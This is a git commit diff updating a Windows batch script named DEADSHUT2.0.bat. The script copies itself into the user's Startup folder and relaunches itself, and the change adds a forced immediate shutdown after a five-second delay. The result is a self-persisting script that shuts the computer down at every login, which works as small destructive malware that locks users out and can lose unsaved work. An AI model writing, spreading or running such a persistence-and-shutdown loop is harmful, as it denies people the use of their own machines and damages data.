6828fe74429c3061592930faa05438dcae713cd4
RealSkyskysun <geniuswang2234@gmail.com>
2024-05-21 15:01:06 +1200

    Update DEADSHUT2.0.bat

--- DEADSHUT2.0.bat
+++ DEADSHUT2.0.bat
@@ -11,8 +11,11 @@ set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 rem Copy the script to the Startup folder
 copy "%script_path%%script_name%" "%startup_folder%" > nul
 
-rem Add a delay before reopening the terminal
+rem Add a delay before shutting down the computer
 timeout /t 5 /nobreak >nul
+
+rem Shutdown the computer
+shutdown /s /f /t 0
 
 rem Reopen the terminal by running the script again
 start "" "%~dpnx0"
